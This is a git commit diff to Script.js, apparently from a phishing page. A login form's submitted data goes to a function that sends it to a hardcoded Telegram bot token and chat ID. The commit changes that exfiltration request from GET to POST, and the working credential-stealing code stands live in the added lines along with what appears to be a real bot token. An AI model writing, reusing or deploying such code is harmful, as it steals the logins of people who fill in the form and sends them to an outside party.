db0be7d5e423a547e68bab195481406475b8483a
Shinarashitokisaki <oneforall2442@gmail.com>
2024-05-25 19:13:37 +0700

    Update Script.js

--- Script.js
+++ Script.js
@@ -9,18 +9,30 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 });
 
 function sendDataToTelegram(data) {
-    const telegramBotToken = '6784104621:AAEVRyReTRmVtL_eGnFIZLbYm3FGkI0zF9m';
+    const telegramBotToken = '6784104621:AAEVRyReTRmVtL_eGnFIZLbYm3FGkI0zF9M';
     const chatId = '7120969628';
 
-    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${data}`)
-        .then(response => {
-            if (response.ok) {
-                alert('Login data sent to Telegram successfully!');
-            } else {
-                alert('Failed to send login data to Telegram.');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-              }
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    const params = {
+        chat_id: chatId,
+        text: data
+    };
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(params)
+    })
+    .then(response => {
+        if (response.ok) {
+            alert('Login data sent to Telegram successfully!');
+        } else {
+            alert('Failed to send login data to Telegram.');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+           }
